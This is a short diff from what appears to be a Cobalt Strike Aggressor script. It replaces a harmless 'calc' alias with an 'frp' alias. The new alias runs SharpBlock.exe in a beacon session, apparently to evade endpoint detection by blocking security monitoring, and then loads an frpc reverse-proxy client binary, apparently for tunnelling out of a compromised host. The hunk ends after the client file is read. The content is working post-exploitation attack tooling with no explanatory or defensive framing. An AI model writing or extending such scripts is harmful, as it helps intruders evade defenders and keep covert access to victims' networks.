@@ -13,10 +13,12 @@ alias upload_file {
 	_upload_file($1, $2, $3);
 }
 
-alias calc {
+alias frp {
     local('$bid');
     $bid = $1;
-    $handle = openf(script_resource("calc.exe"));
+    bexecute_assembly($bid,script_resource("SharpBlock.exe"),"-e \\\\.\\pipe\\pipename -s c:\\windows\\system32\\notepad.exe --disable-bypass-cmdline --disable-bypass-amsi --disable-bypass-etw");
+
+    $handle = openf(script_resource("frpc_windows_x64.exe"));
     $data = readb($handle,-1);
     closef($handle);
 
